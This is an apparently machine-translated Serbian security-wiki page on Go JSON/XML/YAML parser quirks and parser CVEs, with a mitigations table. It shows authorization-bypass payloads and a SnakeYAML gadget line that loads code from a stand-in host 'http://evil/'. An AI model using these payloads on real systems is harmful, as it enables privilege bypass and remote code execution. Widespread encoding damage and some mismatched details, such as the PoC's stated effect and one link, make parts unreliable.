# JSON, XML & Yaml Hacking & Problemi

{{#include ../banners/hacktricks-training.md}}

## Go JSON dekoder

SledeÄ‡i problemi su otkriveni u Go JSON parseru i mogu postojati i u drugim jezicima. Ovi problemi su objavljeni u [**this blog post**](https://blog.trailofbits.com/2025/06/17/unexpected-security-footguns-in-gos-parsers/).

Goâ€™s JSON, XML, and YAML parsers imaju dugu istoriju nekonzistentnosti i nesigurnih podrazumevanih postavki koje mogu biti zloupotrebljene za **bypass authentication**, **escalate privileges**, or **exfiltrate sensitive data**.


### (Un)Marshaling Unexpected Data

Cilj je iskoristiti struct-ove koji omoguÄ‡avaju napadaÄu da Äita/piÅ¡e osetljiva polja (npr., `IsAdmin`, `Password`).

- Primer Struct:
```go
type User struct {
Username string `json:"username,omitempty"`
Password string `json:"password,omitempty"`
IsAdmin  bool   `json:"-"`
}
```
- UobiÄajene ranjivosti

1. **NedostajuÄ‡i tag** (bez taga = polje se i dalje parsira po podrazumevanoj vrednosti):
```go
type User struct {
Username string
}
```
Payload:
```json
{"Username": "admin"}
```
2. **Neispravna upotreba `-`**:
```go
type User struct {
IsAdmin bool `json:"-,omitempty"` // âŒ wrong
}
```
Payload:
```json
{"-": true}
```
âœ”ï¸ Ispravan naÄin da se spreÄi da polje bude (un)marshaled:
```go
type User struct {
IsAdmin bool `json:"-"`
}
```
### Razlike u parserima

Cilj je da se bypass authorization iskoriÅ¡Ä‡avanjem toga kako razliÄiti parseri interpretiraju isti payload na razliÄite naÄine, na primer:
- CVE-2017-12635: Apache CouchDB bypass via duplicate keys
- 2022: Zoom 0-click RCE via XML parser inconsistency
- GitLab 2025 SAML bypass via XML quirks


**1. Duplirana polja:**
Go's `encoding/json` uzima **poslednje** polje.
```go
json.Unmarshal([]byte(`{"action":"UserAction", "action":"AdminAction"}`), &req)
fmt.Println(req.Action) // AdminAction
```
Drugi parseri (npr. Javaâ€™s Jackson) mogu uzeti **prvi**.

**2. Neosetljivost na veliÄinu slova:**
Go nije osetljiv na veliÄinu slova:
```go
json.Unmarshal([]byte(`{"AcTiOn":"AdminAction"}`), &req)
// matches `Action` field
```
ÄŒak i Unicode trikovi rade:
```go
json.Unmarshal([]byte(`{"aâ„ªtionÅ¿": "bypass"}`), &req)
```
**3. Cross-service mismatch:**
Zamisli:
- Proxy napisan u Go
- AuthZ servis napisan u Pythonu

NapadaÄ Å¡alje:
```json
{
"action": "UserAction",
"AcTiOn": "AdminAction"
}
```
- Python vidi `UserAction`, dozvoljava ga
- Go vidi `AdminAction`, izvrÅ¡ava ga


### Zbrka formata podataka (Polyglots)

Cilj je iskoristiti sisteme koji meÅ¡aju formate (JSON/XML/YAML) ili propuste bezbednost pri greÅ¡kama parsiranja, npr:
- **CVE-2020-16250**: HashiCorp Vault je parsirao JSON koristeÄ‡i XML parser nakon Å¡to je STS vratio JSON umesto XML-a.

NapadaÄ kontroliÅ¡e:
- Zaglavlje `Accept: application/json`
- DelimiÄna kontrola nad JSON telom

Go-ov XML parser ga je **ipak** parsirao i verovao ubaÄenom identitetu.

- Sastavljen payload:
```json
{
"action": "Action_1",
"AcTiOn": "Action_2",
"ignored": "<?xml version=\"1.0\"?><Action>Action_3</Action>"
}
```
Rezultat:
- **Go JSON** parser: `Action_2` (neosetljivo na veliÄinu slova + vaÅ¾i poslednji)
- **YAML** parser: `Action_1` (osetljivo na veliÄinu slova)
- **XML** parser: parsira `"Action_3"` unutar stringa

---

## ZnaÄajne ranjivosti parsera (2023-2025)

> SledeÄ‡i javno-iskoristivi propusti pokazuju da nesigurno parsiranje predstavlja problem viÅ¡e jezika â€” ne samo problem u Go-u.

### SnakeYAML Deserialization RCE (CVE-2022-1471)

* PogaÄ‘a: `org.yaml:snakeyaml` < **2.0** (koji se koristi u Spring-Boot, Jenkins, itd.).
* Korenski uzrok: `new Constructor()` deserijalizuje **proizvoljne Java klase**, omoguÄ‡avajuÄ‡i lanac gadgeta koji kulminira izvrÅ¡enjem koda na daljinu.
* One-liner PoC (Ä‡e otvoriti kalkulator na ranjivom hostu):
```yaml
!!javax.script.ScriptEngineManager [ !!java.net.URLClassLoader [[ !!java.net.URL ["http://evil/"] ] ] ]
```
* Popravka / UblaÅ¾avanje:
1. **Upgrade to â‰¥2.0** (koristi `SafeLoader` po defaultu).
2. Na starijim verzijama, eksplicitno koristite `new Yaml(new SafeConstructor())`.

### libyaml Double-Free (CVE-2024-35325)

* Affects: `libyaml` â‰¤0.2.5 (C biblioteka koju koriste mnoge vezivke za programske jezike).
* Issue: Pozivanje `yaml_event_delete()` dva puta dovodi do double-free-a koji napadaÄi mogu iskoristiti za DoS ili, u nekim scenarijima, heap exploitation.
* Status: Upstream je odbio kao â€API misuseâ€œ, ali Linux distribucije su isporuÄile ispravljenu **0.2.6** koja defensivno postavlja pokazivaÄ na null pre oslobaÄ‘anja.

### RapidJSON Integer (Under|Over)-flow (CVE-2024-38517 / CVE-2024-39684)

* Affects: Tencent **RapidJSON** pre commita `8269bc2` (<1.1.0-patch-22).
* Bug: U `GenericReader::ParseNumber()` nekontrolisana aritmetika omoguÄ‡ava napadaÄima da kreiraju ogromne numeriÄke literale koji se prelamaju (wrap around) i korumpiraju heap â€” Å¡to na kraju moÅ¾e omoguÄ‡iti eskalaciju privilegija kada se dobijeni objekat koristi za odluke o autorizaciji.

---

### ğŸ” Mitigations (Updated)

| Risk                                | Fix / Recommendation                                      |
|-------------------------------------|------------------------------------------------------------|
| Nepoznata polja (JSON)              | `decoder.DisallowUnknownFields()`                          |
| Duplikat polja (JSON)               | âŒ No fix in stdlib â€” validate with [`jsoncheck`](https://github.com/dvsekhvalnov/johnny-five) |
| PoreÄ‘enje bez obzira na veliÄinu slova (Go) | âŒ No fix â€” validate struct tags + pre-canonicalize input   |
| Nevalidni podaci u XML / XXE        | Koristite ojaÄani parser (`encoding/xml` + `DisallowDTD`)     |
| Nepoznati kljuÄevi u YAML-u         | `yaml.KnownFields(true)`                                   |
| **Unsafe YAML deserialization**     | Koristite SafeConstructor / upgrade to SnakeYAML â‰¥2.0      |
| libyaml â‰¤0.2.5 double-free          | Upgrade to **0.2.6** or distro-patched release            |
| RapidJSON <patched commit           | Compile against latest RapidJSON (â‰¥July 2024)              |

## See also

{{#ref}}
mass-assignment-cwe-915.md
{{#endref}}

## References

- Baeldung â€“ â€œResolving CVE-2022-1471 With SnakeYAML 2.0â€
- Ubuntu Security Tracker â€“ CVE-2024-35325 (libyaml)

{{#include ../banners/hacktricks-training.md}}
